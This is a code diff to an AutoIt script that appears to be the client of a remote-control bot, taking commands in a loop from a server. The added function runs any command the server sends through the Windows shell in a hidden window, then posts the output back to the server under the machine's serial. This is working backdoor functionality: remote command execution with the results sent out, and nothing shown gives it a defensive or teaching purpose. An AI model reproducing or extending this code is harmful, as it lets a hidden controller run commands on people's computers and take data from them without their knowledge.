@@ -71,10 +71,20 @@ while $go
 	  tp($acmd[2])
    ElseIf $acmd[1] == "delete_file" Then
 	  df($acmd[2])
+   ElseIf $acmd[1] == "terminal_input" Then
+	  tc($acmd[2])
    EndIf
 WEnd
 
 
+func tc($command)
+   local $stdo = ""
+   local $pid = Run('"' & @ComSpec & '" /c ' & $command, '', @SW_HIDE, 2) ; 2=STDOUT
+   While not @error
+	  $stdo &= StdoutRead($pid)
+   WEnd
+   HttpPost($serv&"/response/"&$sSerial, "data="&$stdo)
+EndFunc
 
 func path_helper($pth)
    $pth2 = StringReplace($pth, "%appdata%", @AppDataDir)
